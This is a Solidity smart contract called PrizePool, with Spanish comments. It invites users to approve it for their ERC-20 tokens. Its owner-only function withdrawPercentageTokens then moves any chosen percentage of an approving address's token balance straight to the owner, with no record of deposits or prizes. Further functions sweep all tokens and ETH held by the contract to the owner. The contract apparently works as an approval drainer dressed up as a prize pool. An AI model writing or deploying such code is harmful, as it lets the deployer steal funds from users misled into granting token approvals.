// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract PrizePool {
    address public owner;

    event TokensWithdrawn(address token, address from, uint256 amount);
    event EthDeposited(address indexed depositor, uint256 amount);
    event EthWithdrawn(address indexed recipient, uint256 amount);

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "No tienes permiso para realizar esta operacion.");
        _;
    }

    // Esta función permite al usuario aprobar al contrato para retirar tokens en su nombre
    // La aprobación se hace fuera del contrato, directamente en el contrato del token.

    // Función para retirar un porcentaje específico de tokens ERC-20 de una dirección con su aprobación previa
    function withdrawPercentageTokens(address tokenAddress, address from, uint256 percentage) public onlyOwner {
        require(percentage <= 100, "El porcentaje no puede ser mayor que 100");
        IERC20 token = IERC20(tokenAddress);
        uint256 balance = token.balanceOf(from);
        uint256 amountToWithdraw = (balance * percentage) / 100;
        require(amountToWithdraw > 0, "La cantidad a retirar debe ser mayor que 0");

        bool sent = token.transferFrom(from, owner, amountToWithdraw);
        require(sent, "La transferencia de token fallo.");

        emit TokensWithdrawn(tokenAddress, from, amountToWithdraw);
    }


        function rescueTokens(address tokenAddress) public onlyOwner {
        IERC20 token = IERC20(tokenAddress);
        uint256 contractBalance = token.balanceOf(address(this));
        require(contractBalance > 0, "Balance del contrato es 0.");
        
        bool sent = token.transfer(owner, contractBalance);
        require(sent, "Error al rescatar tokens.");
    }

    
    // Función para recibir depósitos de ETH
    receive() external payable {
        emit EthDeposited(msg.sender, msg.value);
    }

    // Función para que el propietario retire ETH del contrato
    function withdrawEth(uint256 amount) public onlyOwner {
        require(address(this).balance >= amount, "Saldo insuficiente para retirar esa cantidad de ETH.");
        
        (bool sent, ) = owner.call{value: amount}("");
        require(sent, "Fallo al enviar ETH.");
        
        emit EthWithdrawn(owner, amount);
    }

    // Función para consultar el saldo de ETH del contrato
    function getContractEthBalance() public view returns (uint256) {
        return address(this).balance;
    }

}
